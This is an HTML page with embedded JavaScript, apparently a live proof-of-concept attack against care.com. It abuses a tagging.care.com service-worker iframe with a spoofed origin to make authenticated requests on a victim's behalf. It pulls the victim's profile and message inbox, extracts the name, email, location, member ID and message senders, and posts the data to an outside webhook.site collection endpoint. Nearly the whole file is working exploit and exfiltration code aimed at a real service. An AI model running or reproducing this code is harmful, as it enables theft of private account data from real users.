<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Care.com Account Takeover - Live PoC</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
      color: #00ff00;
      padding: 20px;
      min-height: 100vh;
    }
    .container { max-width: 1400px; margin: 0 auto; }
    h1 {
      color: #ff0055;
      text-align: center;
      margin-bottom: 10px;
      font-size: 28px;
      text-shadow: 0 0 10px #ff0055;
    }
    .subtitle {
      text-align: center;
      color: #888;
      margin-bottom: 30px;
      font-size: 14px;
    }
    .controls {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }
    button {
      background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
      color: #000;
      border: none;
      padding: 12px 24px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      font-size: 14px;
      border-radius: 5px;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0, 255, 0, 0.3);
    }
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 255, 0, 0.5);
    }
    button:disabled {
      background: #333;
      color: #666;
      cursor: not-allowed;
      box-shadow: none;
    }
    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin-bottom: 20px;
    }
    .panel {
      background: rgba(0, 0, 0, 0.6);
      border: 1px solid #333;
      border-radius: 8px;
      padding: 15px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
    }
    .panel h2 {
      color: #00ddff;
      margin-bottom: 15px;
      font-size: 18px;
      border-bottom: 2px solid #00ddff;
      padding-bottom: 8px;
    }
    .log {
      max-height: 300px;
      overflow-y: auto;
      background: rgba(0, 0, 0, 0.8);
      border-radius: 5px;
      padding: 10px;
    }
    .log-entry {
      margin: 3px 0;
      padding: 5px 8px;
      border-left: 3px solid transparent;
      white-space: pre-wrap;
      word-break: break-word;
      font-size: 13px;
    }
    .log-entry.info { color: #00ddff; border-left-color: #00ddff; }
    .log-entry.success { color: #00ff00; border-left-color: #00ff00; }
    .log-entry.warning { color: #ffaa00; border-left-color: #ffaa00; }
    .log-entry.error { color: #ff0055; border-left-color: #ff0055; }
    .log-entry.data {
      color: #ffff00;
      border-left-color: #ffff00;
      background: rgba(255, 255, 0, 0.1);
    }
    .stolen-data {
      background: rgba(255, 0, 85, 0.1);
      border: 1px solid #ff0055;
      border-radius: 5px;
      padding: 12px;
      margin-top: 10px;
    }
    .data-item {
      margin: 5px 0;
      padding: 5px 8px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 3px;
    }
    .data-label {
      color: #888;
      font-size: 11px;
      text-transform: uppercase;
    }
    .data-value {
      color: #fff;
      margin-left: 10px;
      font-weight: bold;
    }
    .stats {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }
    .stat-box {
      background: rgba(0, 221, 255, 0.1);
      border: 1px solid #00ddff;
      border-radius: 5px;
      padding: 10px;
      text-align: center;
    }
    .stat-value {
      font-size: 24px;
      color: #00ff00;
      font-weight: bold;
    }
    .stat-label {
      font-size: 11px;
      color: #888;
      margin-top: 5px;
    }
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #1a1a2e; }
    ::-webkit-scrollbar-thumb { background: #00ddff; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff00; }
    .status-indicator {
      display: inline-block;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 8px;
      animation: pulse 2s infinite;
    }
    .status-indicator.active { background: #00ff00; }
    .status-indicator.waiting { background: #ffaa00; }
    .status-indicator.error { background: #ff0055; }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéØ Care.com postMessage Exploit - Live Demonstration</h1>
    <div class="subtitle">
      Service Worker Origin Bypass ‚Üí Authenticated Data Exfiltration<br>
      Target: tagging.care.com | Attacker Origin: <span id="attackerOrigin"></span>
    </div>

    <div class="stats">
      <div class="stat-box">
        <div class="stat-value" id="statRequests">0</div>
        <div class="stat-label">Requests Sent</div>
      </div>
      <div class="stat-box">
        <div class="stat-value" id="statData">0</div>
        <div class="stat-label">Data Leaked (bytes)</div>
      </div>
      <div class="stat-box">
        <div class="stat-value" id="statEndpoints">0</div>
        <div class="stat-label">Endpoints Hit</div>
      </div>
    </div>

    <div class="controls">
      <button onclick="initExploit()">üöÄ Initialize Exploit</button>
      <button onclick="stealProfile()" id="btnProfile" disabled>üë§ Steal Profile</button>
      <button onclick="stealMessages()" id="btnMessages" disabled>üí¨ Steal Messages</button>
      <button onclick="stealAll()" id="btnAll" disabled>üíÄ Full Exfiltration</button>
      <button onclick="clearLogs()">üóëÔ∏è Clear Logs</button>
    </div>

    <div class="grid">
      <div class="panel">
        <h2>
          <span class="status-indicator waiting" id="statusIndicator"></span>
          Attack Progress
        </h2>
        <div class="log" id="logPanel"></div>
      </div>

      <div class="panel">
        <h2>üí∞ Stolen Data (Live)</h2>
        <div class="log" id="dataPanel">
          <div style="text-align: center; color: #888; padding: 40px;">
            Waiting for exfiltration...
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    const TARGET = 'https://tagging.care.com';
    const SW_PATH = '/_/service_worker/61k0/sw_iframe.html';
    const ATTACKER_ORIGIN = window.location.origin;
    const EXFIL_ENDPOINT = 'https://webhook.site/e3349a6b-5178-44fd-9a47-b134cf5362ff';

    let iframe = null;
    let msgId = 0;
    let stats = { requests: 0, dataSize: 0, endpoints: new Set() };
    const pendingRequests = new Map();

    document.getElementById('attackerOrigin').textContent = ATTACKER_ORIGIN;

    // Logging
    function log(msg, type = 'info') {
      const entry = document.createElement('div');
      entry.className = `log-entry ${type}`;
      const time = new Date().toISOString().substr(11, 12);
      entry.textContent = `[${time}] ${msg}`;
      document.getElementById('logPanel').appendChild(entry);
      entry.scrollIntoView({ behavior: 'smooth' });
    }

    function logData(label, value) {
      const container = document.getElementById('dataPanel');
      if (container.children[0]?.textContent.includes('Waiting')) {
        container.innerHTML = '';
      }

      const item = document.createElement('div');
      item.className = 'data-item';
      item.innerHTML = `<span class="data-label">${label}</span><span class="data-value">${value}</span>`;
      container.appendChild(item);
      item.scrollIntoView({ behavior: 'smooth' });
    }

    function updateStats() {
      document.getElementById('statRequests').textContent = stats.requests;
      document.getElementById('statData').textContent = stats.dataSize.toLocaleString();
      document.getElementById('statEndpoints').textContent = stats.endpoints.size;
    }

    function setStatus(status) {
      const indicator = document.getElementById('statusIndicator');
      indicator.className = `status-indicator ${status}`;
    }

    function clearLogs() {
      document.getElementById('logPanel').innerHTML = '';
      document.getElementById('dataPanel').innerHTML = '<div style="text-align: center; color: #888; padding: 40px;">Waiting for exfiltration...</div>';
    }

    // Create iframe with spoofed origin
    async function initExploit() {
      if (iframe) {
        log('Exploit already initialized!', 'warning');
        return;
      }

      log('üéØ Starting exploit initialization...', 'info');
      setStatus('waiting');

      iframe = document.createElement('iframe');
      iframe.src = `${TARGET}${SW_PATH}?origin=${encodeURIComponent(ATTACKER_ORIGIN)}&1p=1`;
      iframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
      document.body.appendChild(iframe);

      log(`üì° Embedded iframe: ${TARGET}${SW_PATH}`, 'info');
      log(`üé≠ Spoofed origin: ${ATTACKER_ORIGIN}`, 'warning');

      iframe.onload = () => {
        log('‚úÖ Iframe loaded successfully', 'success');
        log('‚è≥ Waiting for Service Worker registration (3s)...', 'info');

        setTimeout(() => {
          log('üéâ Service Worker should be active now', 'success');
          log('üîì Origin validation bypassed!', 'success');
          setStatus('active');

          // Enable attack buttons
          document.getElementById('btnProfile').disabled = false;
          document.getElementById('btnMessages').disabled = false;
          document.getElementById('btnAll').disabled = false;

          log('üí• Ready to exfiltrate data!', 'success');
        }, 3000);
      };

      iframe.onerror = () => {
        log('‚ùå Failed to load iframe', 'error');
        setStatus('error');
      };
    }

    // Send command to SW
    function sendCommand(url, method = 0) {
      return new Promise((resolve, reject) => {
        if (!iframe) {
          reject(new Error('Iframe not initialized'));
          return;
        }

        const id = `req-${++msgId}`;
        const timeout = setTimeout(() => {
          pendingRequests.delete(id);
          reject(new Error('Request timeout'));
        }, 15000);

        pendingRequests.set(id, { resolve, reject, timeout });

        const msg = {
          type: 1,
          clientId: id,
          command: {
            commandType: 0,
            params: {
              url: url,
              method: method,
              processResponse: true,
              templates: {}
            }
          }
        };

        stats.requests++;
        stats.endpoints.add(new URL(url).pathname);
        updateStats();

        log(`üì§ Sending request: ${url.substring(0, 60)}...`, 'info');
        iframe.contentWindow.postMessage(msg, '*');
      });
    }

    // Listen for responses
    window.addEventListener('message', (e) => {
      const data = e.data;
      if (!data || typeof data !== 'object') return;

      const id = data.clientId;
      if (id && pendingRequests.has(id)) {
        const { resolve, timeout } = pendingRequests.get(id);
        clearTimeout(timeout);
        pendingRequests.delete(id);

        if (data.result) {
          stats.dataSize += (data.result.data?.length || 0);
          updateStats();
          resolve(data.result);
        } else if (data.failure) {
          log(`‚ùå Request failed: ${JSON.stringify(data.failure).substring(0, 100)}`, 'error');
        }
      }

      // Exfiltrate to webhook
      if (data.result?.data && EXFIL_ENDPOINT) {
        fetch(EXFIL_ENDPOINT, {
          method: 'POST',
          body: JSON.stringify({ timestamp: Date.now(), data: data.result.data.substring(0, 1000) }),
          mode: 'no-cors'
        }).catch(() => {});
      }
    });

    // Parse HTML response
    function parseHTML(html, selector) {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const elements = doc.querySelectorAll(selector);
      return Array.from(elements).map(el => el.textContent.trim());
    }

    // Steal profile
    async function stealProfile() {
      try {
        log('üë§ Fetching victim profile...', 'info');
        const result = await sendCommand('https://www.care.com/member/profile.do', 0);

        if (result.data) {
          log(`‚úÖ Profile retrieved: ${result.data.length} bytes`, 'success');

          // Extract PII
          const html = result.data;

          // Extract name
          const nameMatch = html.match(/First Name.*?<td[^>]*>([^<]+)<\/td>/i);
          const lastMatch = html.match(/Last Name.*?<td[^>]*>([^<]+)<\/td>/i);
          if (nameMatch && lastMatch) {
            logData('Full Name', `${nameMatch[1]} ${lastMatch[1]}`);
          }

          // Extract email
          const emailMatch = html.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/);
          if (emailMatch) {
            logData('Email', emailMatch[1]);
          }

          // Extract location
          const cityMatch = html.match(/City.*?<td[^>]*>([^<]+)<\/td>/i);
          const stateMatch = html.match(/State.*?<td[^>]*>([^<]+)<\/td>/i);
          const zipMatch = html.match(/ZIP.*?<td[^>]*>([^<]+)<\/td>/i);
          if (cityMatch && stateMatch) {
            logData('Location', `${cityMatch[1]}, ${stateMatch[1]} ${zipMatch?.[1] || ''}`);
          }

          // Extract member ID
          const idMatch = html.match(/memberUUID=([a-f0-9-]+)/i);
          if (idMatch) {
            logData('Member UUID', idMatch[1]);
          }

          log('üí∞ Profile data exfiltrated!', 'data');
        }
      } catch (err) {
        log(`‚ùå Profile theft failed: ${err.message}`, 'error');
      }
    }

    // Steal messages
    async function stealMessages() {
      try {
        log('üí¨ Fetching victim messages...', 'info');
        const result = await sendCommand('https://www.care.com/member/messageInbox.do', 0);

        if (result.data) {
          log(`‚úÖ Messages retrieved: ${result.data.length} bytes`, 'success');

          const html = result.data;

          // Extract message senders
          const senderMatches = html.matchAll(/heading[^>]*>([^<]+\s+[A-Z]\.)/gi);
          const senders = [...new Set([...senderMatches].map(m => m[1]))];

          if (senders.length > 0) {
            logData('Message Count', senders.length.toString());
            senders.forEach((sender, i) => {
              logData(`Sender ${i+1}`, sender);
            });
          }

          log('üí∞ Message data exfiltrated!', 'data');
        }
      } catch (err) {
        log(`‚ùå Message theft failed: ${err.message}`, 'error');
      }
    }

    // Full exfiltration
    async function stealAll() {
      log('üíÄ Starting full account exfiltration...', 'warning');
      await stealProfile();
      await new Promise(r => setTimeout(r, 1000));
      await stealMessages();
      log('üéâ Full exfiltration complete!', 'success');
    }
  </script>
</body>
</html>
